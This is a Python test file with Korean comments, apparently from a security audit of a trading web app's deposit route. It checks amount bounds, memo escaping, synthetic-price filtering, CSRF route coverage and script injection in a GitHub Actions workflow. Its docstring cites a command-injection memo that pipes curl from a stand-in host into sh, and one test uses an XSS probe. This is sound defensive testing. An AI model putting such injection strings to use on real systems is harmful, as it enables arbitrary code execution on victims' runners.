"""조종석에서 바깥이 바뀌는 자리 (감사 186).

`quant/web/app.py`는 2,072줄인데 변이 항목이 **1건**이었다(전수조사 뒤 밀도를
재 보니 가장 얇은 축). 여기에는 이 시스템에서 **웹 요청 한 번으로 바깥 세상을
바꾸는 유일한 통로**가 있다 — 매칭 입금(공개 장부에 커밋된다).

**돈·인증 경로에서 새 결함은 못 찾았다.** 확인한 것을 적어 둔다.

  · 입금 워크플로는 입력을 `env`로 넘긴다 — `${{ }}`를 `run:`에 직접 쓰면
    메모에 `"; curl evil.sh | sh; #`를 넣어 러너에서 임의 명령이 돈다.
    이미 고쳐져 있었다(2026-08-11).
  · CSRF 보호 목록과 실제 라우트가 지금은 일치한다. 다만 **일치를 강제하는
    것이 없었다** — 새 `/run` 라우트를 추가하면 조용히 무방비가 된다.
    그 드리프트를 여기서 기계적으로 막는다.
  · `inf`·`1e400` 같은 입력은 `OverflowError`를 내지만 서버가 `Exception`으로
    받아 400을 돌려준다(크래시 아님). 메시지가 파이썬 내부 문구인 건 흠이나
    동작은 옳다.

못 박는 계약은 넷이다.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import quant.web.app as A  # noqa: E402


# ── ① 입금 금액의 경계 ────────────────────────────────────────


def _deposit(amount, monkeypatch, memo="t"):
    sent = []
    monkeypatch.setattr(A, "dispatch_deposit",
                        lambda amt, m="": sent.append((amt, m)))
    out = A.run_deposit_html({"amount": amount, "memo": memo})
    return sent, out


def test_an_amount_outside_the_band_never_reaches_the_workflow(monkeypatch):
    """이 값은 공개 장부의 '원금'이 된다 — 상한이 없으면 기록이 오염된다."""
    for bad in ("0", "-5", "10000001", "99999999"):
        sent, out = _deposit(bad, monkeypatch)
        assert sent == [], f"{bad}원이 워크플로까지 나갔다"
        assert "1,000만원 이하" in out, bad


def test_amounts_inside_the_band_do_reach_it(monkeypatch):
    """대조군 — 늘 막으면 입금 기능이 죽은 것과 같다."""
    for good, want in (("1", 1), ("10000", 10_000), ("10000000", 10_000_000),
                       ("  12,345  ", 12_345)):
        sent, _ = _deposit(good, monkeypatch)
        assert sent == [(want, "t")], f"{good} → {sent}"


def test_a_non_number_is_refused_not_guessed(monkeypatch):
    for bad in ("", "0x10", "abc", "nan"):
        sent, out = _deposit(bad, monkeypatch)
        assert sent == [], bad
        assert "숫자가 아닙니다" in out, bad


def test_the_memo_is_clipped_and_escaped(monkeypatch):
    sent, _ = _deposit("10000", monkeypatch, memo="가" * 300)
    assert len(sent[0][1]) == 80, "메모 길이 상한이 없다"

    _, out = _deposit("10000", monkeypatch, memo="<script>alert(1)</script>")
    assert "<script>alert(1)</script>" not in out, "메모가 그대로 렌더링된다"
    assert "&lt;script&gt;" in out


# ── ② 방송에 가짜 시세를 내보내지 않는가 ──────────────────────


class _FakeProvider:
    def __init__(self, synthetic: bool):
        self.synthetic = synthetic

    def get_ohlcv(self, symbol, tf, limit=2):
        import pandas as pd
        idx = pd.date_range("2026-08-01", periods=2, freq="D")
        df = pd.DataFrame({"close": [100.0, 123.0]}, index=idx)
        if self.synthetic:
            df.attrs["synthetic_fallback"] = True
        return df


def _prices(monkeypatch, synthetic: bool):
    import quant.data as D
    A._PRICE_CACHE.update(ts=0.0, prices={})
    monkeypatch.setattr(D, "get_provider", lambda m: _FakeProvider(synthetic))
    return A._live_prices(["crypto:BTC/USDT"], ttl=0.0)


def test_synthetic_prices_never_reach_the_broadcast(monkeypatch):
    """합성 폴백은 데이터가 없을 때의 대역이다 — 화면에 시세로 나가면 거짓말이다."""
    assert _prices(monkeypatch, synthetic=True) == {}, (
        "합성 폴백 가격이 방송 현재가로 나갔다")


def test_real_prices_do_reach_the_broadcast(monkeypatch):
    """대조군 — 늘 비면 방송이 영원히 '지연'으로 뜬다."""
    assert _prices(monkeypatch, synthetic=False) == {"crypto:BTC/USDT": 123.0}


# ── ③ 바깥을 바꾸는 라우트가 CSRF 목록에서 새지 않는가 ────────


def test_every_mutating_route_is_covered_by_the_csrf_list():
    """새 `/run` 라우트를 추가하면 **조용히** 무방비가 된다.

    지금은 목록과 라우트가 일치한다. 일치를 사람이 기억하게 두지 않는다 —
    감사 178에서 정한 '금지 목록' 검사와 같은 계열이다.
    """
    src = (ROOT / "quant" / "web" / "server.py").read_text("utf-8")
    body = src.split("def do_GET", 1)[1]
    routes: set[str] = set()
    for m in re.finditer(r'parsed\.path\s*(?:==|in)\s*(\("[^)]*"\)|"[^"]+")',
                         body):
        routes |= set(re.findall(r'"([^"]+)"', m.group(1)))
    guarded = set(re.findall(r'"([^"]+)"',
                             src.split("_MUTATING = ", 1)[1].split(")", 1)[0]))

    assert routes, "라우트를 하나도 못 찾았다 — 이 검사가 헛돈다"
    mutating = {r for r in routes if r.endswith("/run") or r == "/backtest"}
    assert mutating, "'실행' 라우트를 못 찾았다 — 이 검사가 헛돈다"
    assert mutating <= guarded, (
        f"바깥을 바꾸는데 CSRF 목록에 없는 라우트: {sorted(mutating - guarded)}\n"
        "  → server.py의 _MUTATING에 추가할 것")
    assert guarded <= routes, (
        f"CSRF 목록에 있는데 라우트에 없다(오타·삭제): {sorted(guarded - routes)}")


def test_the_deposit_route_is_the_one_that_must_never_slip():
    """가장 중요한 한 칸은 이름으로 못 박는다 — 목록이 통째로 비어도 걸리게."""
    src = (ROOT / "quant" / "web" / "server.py").read_text("utf-8")
    guarded = src.split("_MUTATING = ", 1)[1].split(")", 1)[0]
    assert '"/deposit/run"' in guarded, (
        "입금 라우트가 CSRF 보호 목록에서 빠졌다 — 아무 웹페이지의 <img> 한 줄로 "
        "가짜 입금이 공개 장부에 커밋된다")


# ── ④ 입금 워크플로가 입력을 셸에 직접 꽂지 않는가 ────────────


def test_the_deposit_workflow_never_interpolates_input_into_a_shell():
    """`${{ }}`를 run: 안에 쓰면 메모 한 줄로 러너에서 임의 명령이 돈다."""
    wf = (ROOT / ".github" / "workflows" / "deposit.yml").read_text("utf-8")
    for line in wf.splitlines():
        if line.lstrip().startswith("#"):
            continue
        if "github.event.inputs" in line:
            assert "env:" in wf.split(line)[0].rsplit("\n", 3)[-3:][0] or \
                ":" in line.split("${{")[0], line
            assert "run:" not in line, (
                f"입력을 run: 줄에 직접 꽂았다 — 스크립트 인젝션: {line.strip()}")
    assert "DEPOSIT_MEMO: ${{ github.event.inputs.memo }}" in wf, (
        "메모를 env로 넘기는 줄이 사라졌다 — 검사가 낡았다")
    assert '"$DEPOSIT_MEMO"' in wf or '${DEPOSIT_MEMO}' in wf
